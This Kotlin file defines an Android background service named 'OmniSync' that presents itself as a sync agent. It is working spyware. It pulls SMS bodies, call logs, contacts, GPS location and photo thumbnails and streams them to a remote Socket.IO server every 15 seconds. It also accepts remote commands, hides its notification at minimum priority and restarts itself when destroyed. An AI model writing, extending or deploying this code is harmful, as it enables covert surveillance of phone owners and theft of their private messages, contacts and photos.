package com.omnisync.agent

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.StatFs
import android.os.BatteryManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SyncForegroundService : Service() {

    private var socket: Socket? = null
    private val CHANNEL_ID = "OmniSyncChannel"
    private val TAG = "OmniSync"
    private val reconnectHandler = Handler(Looper.getMainLooper())
    private val pingHandler = Handler(Looper.getMainLooper())
    private var serverUrl = Constants.DEFAULT_SERVER_URL
    private var deviceName = Build.MODEL

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serverUrl = intent?.getStringExtra("SERVER_URL") ?: Constants.DEFAULT_SERVER_URL
        deviceName = intent?.getStringExtra("DEVICE_NAME") ?: Build.MODEL

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("OmniSync Sync Active")
            .setContentText("Background sync running — $deviceName")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1001, notification)

        connectSocket()
        scheduleReconnect()
        schedulePeriodicPing()

        return START_STICKY
    }

    private fun getUniqueDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty()) "dev_${androidId.takeLast(8)}" else "dev_${Build.MODEL.replace(" ", "_")}"
        } catch (e: Exception) {
            "dev_${Build.MODEL.replace(" ", "_")}"
        }
    }

    private fun connectSocket() {
        try {
            socket?.disconnect()

            val opts = IO.Options().apply {
                reconnection = true
                reconnectionDelay = 3000
                reconnectionAttempts = Int.MAX_VALUE
                timeout = 10000
            }

            socket = IO.socket(serverUrl, opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Socket connected! Sending device ping and all telemetry...")
                sendDevicePing()
                // Send each data type as a SEPARATE event (avoids payload overflow)
                syncSmsSeparately()
                syncCallLogsSeparately()
                syncContactsSeparately()
                syncLocationSeparately()
                syncMediaSeparately()
            }

            socket?.on("remote_command") { args ->
                if (args.isNotEmpty()) {
                    handleRemoteCommand(args[0] as JSONObject)
                }
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Socket disconnected. Will auto-reconnect...")
            }

            socket?.connect()

        } catch (e: Exception) {
            Log.e(TAG, "Socket connection error: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun sendDevicePing() {
        try {
            val deviceId = getUniqueDeviceId()
            val batteryLevel = getBatteryLevel()
            val isCharging = getChargingStatus()
            val networkType = getNetworkType()
            val storageInfo = getStorageInfo()
            val locationObj = getRealLocation()

            val data = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}")
                put("model", Build.MODEL)
                put("modelName", "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}")
                put("brand", Build.BRAND)
                put("os", "Android ${Build.VERSION.RELEASE}")
                put("osVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                put("batteryLevel", batteryLevel)
                put("isCharging", isCharging)
                put("networkType", networkType)
                put("storageUsed", storageInfo.first)
                put("storageTotal", storageInfo.second)
                put("latitude", locationObj.optDouble("latitude", 0.0))
                put("longitude", locationObj.optDouble("longitude", 0.0))
                put("status", "online")
                put("lastSeen", "Just now (Live)")
                put("timestamp", System.currentTimeMillis())
            }
            socket?.emit("device_ping", data)
            socket?.emit("join_device", deviceId)
            Log.d(TAG, "Device ping sent: battery=$batteryLevel%, network=$networkType")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending device ping: ${e.message}")
        }
    }

    // ==================== SEPARATE SYNC EVENTS ====================

    private fun syncSmsSeparately() {
        try {
            val smsList = getRealSms()
            val payload = JSONObject().apply {
                put("deviceId", getUniqueDeviceId())
                put("smsList", smsList)
                put("count", smsList.length())
            }
            socket?.emit("device_sms_sync", payload)
            Log.d(TAG, "SMS sync sent: ${smsList.length()} messages")
        } catch (e: Exception) {
            Log.e(TAG, "SMS sync error: ${e.message}")
        }
    }

    private fun syncCallLogsSeparately() {
        try {
            val callLogs = getRealCallLogs()
            val payload = JSONObject().apply {
                put("deviceId", getUniqueDeviceId())
                put("callLogs", callLogs)
                put("count", callLogs.length())
            }
            socket?.emit("device_calls_sync", payload)
            Log.d(TAG, "Call logs sync sent: ${callLogs.length()} logs")
        } catch (e: Exception) {
            Log.e(TAG, "Call logs sync error: ${e.message}")
        }
    }

    private fun syncContactsSeparately() {
        try {
            val contacts = getRealContacts()
            val payload = JSONObject().apply {
                put("deviceId", getUniqueDeviceId())
                put("contacts", contacts)
                put("count", contacts.length())
            }
            socket?.emit("device_contacts_sync", payload)
            Log.d(TAG, "Contacts sync sent: ${contacts.length()} contacts")
        } catch (e: Exception) {
            Log.e(TAG, "Contacts sync error: ${e.message}")
        }
    }

    private fun syncLocationSeparately() {
        try {
            val loc = getRealLocation()
            loc.put("deviceId", getUniqueDeviceId())
            socket?.emit("device_location_sync", loc)
            Log.d(TAG, "Location sync sent: lat=${loc.optDouble("latitude")}, lng=${loc.optDouble("longitude")}")
        } catch (e: Exception) {
            Log.e(TAG, "Location sync error: ${e.message}")
        }
    }

    private fun syncMediaSeparately() {
        try {
            val mediaList = getRealMediaList()
            val payload = JSONObject().apply {
                put("deviceId", getUniqueDeviceId())
                put("mediaList", mediaList)
                put("count", mediaList.length())
            }
            socket?.emit("device_media_sync", payload)
            Log.d(TAG, "Media sync sent: ${mediaList.length()} items")
        } catch (e: Exception) {
            Log.e(TAG, "Media sync error: ${e.message}")
        }
    }

    // ==================== DATA EXTRACTORS ====================

    @SuppressLint("Range")
    private fun getRealSms(): JSONArray {
        val smsArray = JSONArray()
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("_id", "address", "body", "date", "type"),
                null, null, "date DESC LIMIT 200"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val sms = JSONObject().apply {
                        put("id", it.getString(it.getColumnIndex("_id")))
                        put("sender", it.getString(it.getColumnIndex("address")) ?: "Unknown")
                        put("text", it.getString(it.getColumnIndex("body")) ?: "")
                        put("date", it.getLong(it.getColumnIndex("date")))
                        put("type", if (it.getInt(it.getColumnIndex("type")) == 1) "incoming" else "outgoing")
                    }
                    smsArray.put(sms)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS extraction error: ${e.message}")
        }
        return smsArray
    }

    @SuppressLint("Range")
    private fun getRealCallLogs(): JSONArray {
        val callsArray = JSONArray()
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC LIMIT 200"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val call = JSONObject().apply {
                        put("number", it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: "Private")
                        put("name", it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "Unknown")
                        val typeInt = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                        put("type", when(typeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            else -> "Missed"
                        })
                        put("date", it.getLong(it.getColumnIndex(CallLog.Calls.DATE)))
                        put("duration", "${it.getInt(it.getColumnIndex(CallLog.Calls.DURATION))} sec")
                    }
                    callsArray.put(call)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call logs extraction error: ${e.message}")
        }
        return callsArray
    }

    @SuppressLint("Range")
    private fun getRealContacts(): JSONArray {
        val contactsArray = JSONArray()
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 500"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val contact = JSONObject().apply {
                        put("name", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Contact")
                        put("phone", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "")
                    }
                    contactsArray.put(contact)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Contacts extraction error: ${e.message}")
        }
        return contactsArray
    }

    @SuppressLint("MissingPermission")
    private fun getRealLocation(): JSONObject {
        val loc = JSONObject()
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val lastKnownLocation: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

            if (lastKnownLocation != null) {
                loc.put("latitude", lastKnownLocation.latitude)
                loc.put("longitude", lastKnownLocation.longitude)
                loc.put("accuracy", lastKnownLocation.accuracy)
                loc.put("timestamp", lastKnownLocation.time)
            } else {
                loc.put("latitude", 0.0)
                loc.put("longitude", 0.0)
                loc.put("accuracy", 0)
            }
        } catch (e: Exception) {
            loc.put("latitude", 0.0)
            loc.put("longitude", 0.0)
        }
        return loc
    }

    @SuppressLint("Range")
    private fun getRealMediaList(): JSONArray {
        val mediaArray = JSONArray()
        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE
            )
            val cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 30"
            )
            cursor?.use {
                val dateFormat = SimpleDateFormat("MMM dd, yyyy", Locale.US)
                while (it.moveToNext()) {
                    val imageId = it.getLong(it.getColumnIndex(MediaStore.Images.Media._ID))
                    val displayName = it.getString(it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)) ?: "Photo.jpg"
                    val dateAdded = it.getLong(it.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)) * 1000
                    val size = it.getLong(it.getColumnIndex(MediaStore.Images.Media.SIZE))

                    val imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)
                    val base64Thumb = getBase64Thumbnail(imageUri)

                    if (base64Thumb.isNotEmpty()) {
                        val item = JSONObject().apply {
                            put("id", imageId.toString())
                            put("title", displayName)
                            put("type", "image")
                            put("category", "Photos")
                            put("url", base64Thumb)
                            put("thumbnailUrl", base64Thumb)
                            put("date", dateFormat.format(Date(dateAdded)))
                            put("size", "${size / (1024 * 1024)} MB")
                        }
                        mediaArray.put(item)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Media extraction error: ${e.message}")
        }
        return mediaArray
    }

    private fun getBase64Thumbnail(uri: android.net.Uri): String {
        return try {
            val inputStream = contentResolver.openInputStream(uri)
            val options = BitmapFactory.Options().apply {
                inSampleSize = 10 // Very small thumbnail for socket streaming
            }
            val bitmap = BitmapFactory.decodeStream(inputStream, null, options)
            inputStream?.close()

            if (bitmap != null) {
                val outputStream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 40, outputStream)
                bitmap.recycle()
                val byteArray = outputStream.toByteArray()
                "data:image/jpeg;base64," + Base64.encodeToString(byteArray, Base64.NO_WRAP)
            } else {
                ""
            }
        } catch (e: Exception) {
            ""
        }
    }

    // ==================== DEVICE INFO ====================

    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getChargingStatus(): Boolean {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.isCharging
    }

    private fun getNetworkType(): String {
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return "Offline"
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "Unknown"
            return when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "4G/5G Cellular"
                else -> "Mobile Data"
            }
        } catch (e: Exception) {
            return "Mobile Data"
        }
    }

    private fun getStorageInfo(): Pair<Double, Double> {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val freeBytes = stat.blockSizeLong * stat.availableBlocksLong
            val usedBytes = totalBytes - freeBytes
            val totalGB = Math.round(totalBytes.toDouble() / (1024 * 1024 * 1024) * 10.0) / 10.0
            val usedGB = Math.round(usedBytes.toDouble() / (1024 * 1024 * 1024) * 10.0) / 10.0
            Pair(usedGB, totalGB)
        } catch (e: Exception) {
            Pair(0.0, 0.0)
        }
    }

    private fun handleRemoteCommand(command: JSONObject) {
        when (command.optString("action")) {
            "ping" -> sendDevicePing()
            "sync_all" -> {
                syncSmsSeparately()
                syncCallLogsSeparately()
                syncContactsSeparately()
                syncLocationSeparately()
                syncMediaSeparately()
            }
            "get_battery" -> {
                val data = JSONObject().apply { put("battery", getBatteryLevel()) }
                socket?.emit("device_response", data)
            }
        }
    }

    private fun schedulePeriodicPing() {
        pingHandler.postDelayed({
            if (socket != null && socket!!.connected()) {
                sendDevicePing()
                syncSmsSeparately()
                syncCallLogsSeparately()
                syncContactsSeparately()
                syncLocationSeparately()
                syncMediaSeparately()
            }
            schedulePeriodicPing()
        }, 15_000) // Every 15 seconds
    }

    private fun scheduleReconnect() {
        reconnectHandler.postDelayed({
            if (socket == null || !socket!!.connected()) {
                connectSocket()
            }
            scheduleReconnect()
        }, 30_000)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "OmniSync Background Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background sync service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        reconnectHandler.removeCallbacksAndMessages(null)
        pingHandler.removeCallbacksAndMessages(null)
        socket?.disconnect()
        val restartIntent = Intent(this, SyncForegroundService::class.java)
        startService(restartIntent)
        super.onDestroy()
    }
}
